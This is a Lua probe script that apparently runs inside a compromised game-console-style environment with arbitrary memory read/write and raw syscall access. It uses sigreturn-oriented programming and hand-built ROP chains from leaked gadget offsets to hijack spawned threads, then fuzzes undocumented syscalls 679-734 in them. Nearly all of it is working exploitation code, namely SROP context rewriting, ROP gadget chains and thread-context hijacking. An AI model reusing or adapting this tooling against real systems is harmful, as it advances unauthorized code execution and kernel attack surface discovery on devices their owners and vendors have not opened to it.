-- CRASH_CLASS: MODERATE
-- PROBE 147b: Sysent survey via isolated child threads
--
-- Each syscall is tested in a child thread. If the syscall kills the
-- thread, main thread survives. Tests 679-700 (known 677/678 lethal+gamecrash).

print("=== PROBE 147b: THREAD-ISOLATED SYSENT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)
local sc_ns = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local bh, bl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", bh, bl - 2))

local function srop(num, a1, a2)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local g_ret = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_mov_store = uint64(string.format("0x%X%08X", ehi, elo + 0x92C67))

-- Wait helper
local ts_200ms = memory.alloc(16)
wq(ts_200ms, uint64(0))
wq(ts_200ms + 8, uint64(200000000))

local tspec_long = gpu + 0x200
wq(tspec_long, uint64(30))
wq(tspec_long + 8, uint64(0))

-- Test one syscall in isolated thread
local function test_syscall(num, idx)
    local base = gpu + 0x10000 + idx * 0x8000
    local ctx = base
    local stack = base + 0x1000
    local result = base + 0x7F00
    local tid_slot = base + 0x7F10

    -- Clear
    for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
    for off = 0, 0xFFF, 4 do wd(stack + off, 0) end
    wq(result, uint64(0xDEADDEADDEADDEAD))
    wq(tid_slot, uint64(0))

    -- Get fresh context
    pcall(function() return sc_gc(uint64(ctx)) end)

    -- Zero the arg registers in context
    wq(ctx + 0x48, uint64(0))   -- RDI = 0
    wq(ctx + 0x50, uint64(0))   -- RSI = 0
    wq(ctx + 0x58, uint64(0))   -- RDX = 0
    wq(ctx + 0x60, uint64(0))   -- RCX = 0
    wq(ctx + 0x68, uint64(0))   -- R8 = 0
    wq(ctx + 0x70, uint64(0))   -- R9 = 0
    wq(ctx + 0x90, uint64(0))   -- R10 = 0

    -- ROP chain: pop_rax→N, syscall, pop_rdi→result, mov_store, nanosleep
    local rop = stack + 0xF00
    wq(rop + 0x00, g_pop_rax)
    wq(rop + 0x08, uint64(num))
    wq(rop + 0x10, sc_addr)
    -- After syscall, save RAX (return value)
    wq(rop + 0x18, g_pop_rdi)
    wq(rop + 0x20, ua(result))
    wq(rop + 0x28, g_mov_store)
    -- nanosleep(30s) to keep thread alive
    wq(rop + 0x30, g_pop_rdi)
    wq(rop + 0x38, ua(tspec_long))
    wq(rop + 0x40, g_pop_rsi)
    wq(rop + 0x48, uint64(0))
    wq(rop + 0x50, g_pop_rax)
    wq(rop + 0x58, uint64(240))
    wq(rop + 0x60, sc_addr)

    wq(ctx + 0xE0, g_ret)       -- RIP → start of ROP
    wq(ctx + 0xF8, ua(rop))     -- RSP → ROP chain

    local ok_t, rv_t = pcall(function()
        return sc_thr(uint64(ctx), uint64(tid_slot), uint64(0))
    end)

    if not ok_t or to_num(rv_t) ~= 0 then
        return "THR_FAIL", nil
    end

    local tq = safe_rq(tid_slot)
    local th, tl = get_hi_lo(tq)

    -- Wait 200ms for the thread to execute
    pcall(function() sc_ns(uint64(ts_200ms), uint64(0)) end)

    -- Check if thread alive
    local kill_rv = srop(433, uint64(tl), uint64(0))
    local kh, kl = get_hi_lo(kill_rv)
    local alive = (kl == 0 and kh == 0)

    -- Read result
    local res = safe_rq(result)
    local rh2, rl2 = get_hi_lo(res)
    local sentinel = (rh2 == 0xDEADDEAD and rl2 == 0xDEADDEAD)

    if alive and not sentinel then
        return "RET", hex(res)
    elseif alive and sentinel then
        return "ALIVE_NO_WRITE", nil
    else
        return "KILLED", nil
    end
end

print("")
print("--- [A] Baseline: test known syscalls ---")
local st, rv

st, rv = test_syscall(20, 0)   -- getpid
print("[A] sys 20 (getpid): " .. st .. " " .. (rv or ""))

st, rv = test_syscall(24, 0)   -- getuid
print("[A] sys 24 (getuid): " .. st .. " " .. (rv or ""))

st, rv = test_syscall(4095, 0) -- definitely invalid
print("[A] sys 4095 (invalid): " .. st .. " " .. (rv or ""))

print("pid=" .. to_num(sc20()))

print("")
print("--- [B] Sysent 679-700 ---")
for num = 679, 700 do
    local slot = (num - 679) % 4
    st, rv = test_syscall(num, slot)
    print("[B] sys " .. num .. ": " .. st .. " " .. (rv or ""))
    -- Check main thread alive
    if to_num(sc20()) ~= pid then
        print("[B] MAIN THREAD DIED!")
        break
    end
end

print("")
print("--- [C] Sysent 701-720 ---")
for num = 701, 720 do
    local slot = (num - 701) % 4
    st, rv = test_syscall(num, slot)
    print("[C] sys " .. num .. ": " .. st .. " " .. (rv or ""))
    if to_num(sc20()) ~= pid then
        print("[C] MAIN THREAD DIED!")
        break
    end
end

print("")
print("--- [D] Sysent 721-734 ---")
for num = 721, 734 do
    local slot = (num - 721) % 4
    st, rv = test_syscall(num, slot)
    print("[D] sys " .. num .. ": " .. st .. " " .. (rv or ""))
    if to_num(sc20()) ~= pid then
        print("[D] MAIN THREAD DIED!")
        break
    end
end

print("")
print("pid_final=" .. to_num(sc20()))
print("=== PROBE 147b COMPLETE ===")
